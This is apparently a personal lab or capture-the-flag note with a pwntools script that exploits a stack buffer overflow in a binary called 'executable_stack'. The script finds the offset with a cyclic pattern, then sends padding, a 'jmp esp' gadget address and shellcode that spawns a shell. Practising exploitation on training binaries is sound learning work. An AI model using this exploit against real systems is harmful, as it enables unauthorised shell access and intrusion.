
from pwn import *
import sys

context.update(arch='i386', os='linux')

io = process("./executable_stack")

io = remote("", ###)

gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()


![[Pasted image 20231227205849.png]]



binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))

print (hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())])

io.sendline(exploit)
io.interactive()


![[Pasted image 20231227210023.png]]

![[Pasted image 20231227210257.png]]


